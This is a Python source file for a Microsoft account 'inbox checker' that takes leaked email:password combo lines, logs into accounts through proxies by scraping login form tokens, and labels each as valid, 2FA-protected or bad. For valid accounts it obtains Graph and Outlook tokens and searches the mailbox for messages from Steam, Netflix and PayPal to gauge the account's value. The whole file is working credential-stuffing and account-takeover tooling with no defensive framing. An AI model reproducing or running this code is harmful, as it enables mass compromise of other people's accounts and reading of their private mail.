import re
import time
import uuid
import requests
import urllib3
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════
#  KONFIG (az eredeti CONFIG['timeout'] helyett)
# ══════════════════════════════════════════
TIMEOUT = 15
MAX_RETRIES = 3


def format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith('http'):
        return proxy
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


def format_last_date(date_str):
    if not date_str or date_str == "N/A":
        return "N/A"
    try:
        clean = date_str.replace('Z', '')
        if '.' in clean:
            clean = clean.split('.')[0]
        dt = datetime.fromisoformat(clean)
        return dt.strftime("%Y-%m-%d %H:%M")
    except Exception:
        return date_str


def normalize_combo(line):
    line = line.strip()
    if not line:
        return None
    for sep in [':', '|', ';', ',', '\t', ' ']:
        if sep in line:
            parts = line.split(sep, 1)
            email = parts[0].strip()
            pw = parts[1].strip()
            if email and pw and '@' in email:
                return f"{email}:{pw}"
    return None


def create_optimized_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=100,
        pool_maxsize=100
    )
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.access_token = None
        self.cid = None
        self.country = None
        self.name = None
        self.sFTTag_url = (
            'https://login.live.com/oauth20_authorize.srf?'
            'client_id=00000000402B5328&'
            'redirect_uri=https://login.live.com/oauth20_desktop.srf&'
            'scope=service::user.auth.xboxlive.com::MBI_SSL&'
            'display=touch&response_type=token&locale=en'
        )

    def get_urlPost_sFTTag(self):
        attempts = 0
        while attempts < MAX_RETRIES:
            try:
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                text = self.session.get(self.sFTTag_url, headers=headers, timeout=TIMEOUT, verify=False).text

                match = (re.search(r'value=\\\\"(.+?)\\\\"', text, re.S) or
                         re.search(r'value="(.+?)"', text, re.S) or
                         re.search(r"sFTTag:'(.+?)'", text, re.S) or
                         re.search(r'sFTTag:"(.+?)"', text, re.S) or
                         re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))

                if match:
                    sFTTag = match.group(1)
                    match2 = (re.search(r'"urlPost":"(.+?)"', text, re.S) or
                              re.search(r"urlPost:'(.+?)'", text, re.S) or
                              re.search(r'<form.*?action="(.+?)"', text, re.S))
                    if match2:
                        urlPost = match2.group(1).replace('&amp;', '&')
                        return urlPost, sFTTag
            except Exception:
                pass
            attempts += 1
            time.sleep(0.5)
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        tries = 0
        while tries < MAX_RETRIES:
            try:
                data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'close'
                }
                login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=TIMEOUT, verify=False)

                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'

                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        if ipt and pprid and uaid:
                            d = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=d, allow_redirects=True, timeout=TIMEOUT, verify=False)
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True, timeout=TIMEOUT, verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        return 'SUCCESS'
                    except Exception:
                        pass

                elif any(v in login_request.text for v in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA'

                elif any(v in login_request.text.lower() for v in [
                    'password is incorrect', "account doesn't exist", "that microsoft account doesn't exist",
                    'sign in to your microsoft account', "tried to sign in too many times with an incorrect account or password",
                    'help us protect your account'
                ]):
                    return 'BAD'
            except Exception:
                pass
            tries += 1
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_graph_token(self):
        try:
            client_id = '0000000048170EF2'
            scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = self.session.get(auth_url, timeout=TIMEOUT, verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            if not token:
                scope = 'https://graph.microsoft.com/Mail.Read'
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=TIMEOUT, verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
            return token
        except Exception:
            return None

    def get_profile_via_graph(self, token):
        try:
            headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                if not self.country or self.country == 'Unknown':
                    try:
                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers, timeout=10, verify=False)
                        if r2.status_code == 200:
                            self.country = r2.json().get('timeZone', 'Unknown')
                    except Exception:
                        pass
                self.name = data.get('displayName', 'Unknown')
                return True
            return False
        except Exception:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = self.session.get(auth_url, timeout=TIMEOUT, verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            if not token:
                return False
            self.cid = self.session.cookies.get('MSPCID', self.email)
            headers = {
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{self.cid}',
                'Content-Type': 'application/json',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json'
            }
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers=headers, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                return True
            return False
        except Exception:
            return False

    def check_inbox_via_graph(self):
        token = self.get_graph_token()
        if not token:
            return 0, [], {}
        found_info = []
        total_found_sum = 0
        keyword_dates = {}
        headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}

        for keyword in self.inbox_keywords:
            try:
                query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25&$orderby=receivedDateTime desc"
                r = self.session.get(query, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = data.get('@odata.count', 0)
                    if total == 0 and 'value' in data:
                        total = len(data['value'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        if 'value' in data and len(data['value']) > 0:
                            keyword_dates[keyword] = format_last_date(data['value'][0].get('receivedDateTime', 'N/A'))
                        try:
                            query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject,receivedDateTime&$top=25&$orderby=receivedDateTime desc"
                            r2 = self.session.get(query2, headers=headers, timeout=10, verify=False)
                            if r2.status_code == 200:
                                data2 = r2.json()
                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                if total2 > 0:
                                    total_found_sum += total2
                                    found_info.append(f"{keyword}(body): {total2}")
                                    if 'value' in data2 and len(data2['value']) > 0:
                                        keyword_dates[f"{keyword}(body)"] = format_last_date(data2['value'][0].get('receivedDateTime', 'N/A'))
                        except Exception:
                            pass
            except Exception:
                pass
        return total_found_sum, found_info, keyword_dates

    def check_inbox(self):
        total_found, found_info, keyword_dates = self.check_inbox_via_graph()
        if total_found > 0:
            return total_found, found_info, keyword_dates

        token = self.get_access_token_for_outlook()
        if not token:
            return 0, [], {}

        cid = self.session.cookies.get('MSPCID', self.email)
        headers = {
            'Authorization': f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json',
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Host': 'substrate.office.com'
        }
        found_info = []
        total_found_sum = 0
        keyword_dates = {}
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'

        for keyword in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0,
                        'Query': {'QueryString': keyword},
                        'Size': 25,
                        'Sort': [{'Field': 'Score', 'SortDirection': 'Desc', 'Count': 3}, {'Field': 'Time', 'SortDirection': 'Desc'}],
                        'EnableTopResults': True,
                        'TopResultsCount': 3
                    }],
                    'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                r = self.session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    search_text = r.text
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set:
                                        total = result_set['Total']
                                    elif 'ResultCount' in result_set:
                                        total = result_set['ResultCount']
                                    elif 'Results' in result_set:
                                        total = len(result_set['Results'])
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        date_start = search_text.find('"LastModifiedTime":"')
                        last_date = "N/A"
                        if date_start != -1:
                            date_start += len('"LastModifiedTime":"')
                            date_end = search_text.find('"', date_start)
                            if date_end != -1:
                                last_date = search_text[date_start:date_end]
                        keyword_dates[keyword] = format_last_date(last_date)
            except Exception:
                pass
        return total_found_sum, found_info, keyword_dates

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            r = self.session.get(auth_url, timeout=TIMEOUT, verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            if not token:
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=TIMEOUT, verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
            return token
        except Exception:
            return None
